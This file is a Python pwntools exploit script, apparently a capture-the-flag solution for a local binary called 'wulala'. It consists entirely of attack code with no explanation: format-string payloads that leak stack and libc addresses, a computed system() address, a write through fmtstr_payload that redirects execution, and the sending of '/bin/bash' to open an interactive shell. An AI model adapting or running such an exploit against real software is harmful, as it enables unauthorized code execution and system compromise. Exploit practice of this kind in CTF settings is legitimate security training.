# -*- coding: utf-8 -*-
from pwn import *
elf = ELF('./wulala')
r = process('./wulala')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.binary='./wulala'

offset=6
offsetrop=18
mainret=20
payload="%03c"+'%c'*18+"%hhn"+"%0{}d".format(16*10-21)+"%20$hhn"+"%18$s"+"%23$s"
r.sendline(payload)
ans=r.recv()
ret=u64(ans[-8:])
ret18=u64(ans[-16:-8])
offset_r_sys=0x7ffff7a42f2a-0x7ffff7a63d40
sys_addr=ret-offset_r_sys
pay="%03c"+'%c'*18+"%hhn"+"%0{}d".format(16*10-21)+fmtstr_payload(offsetrop,{ret18+8:sys_addr})
r.sendline(pay)
r.sendline("/bin/bash")
r.interactive();
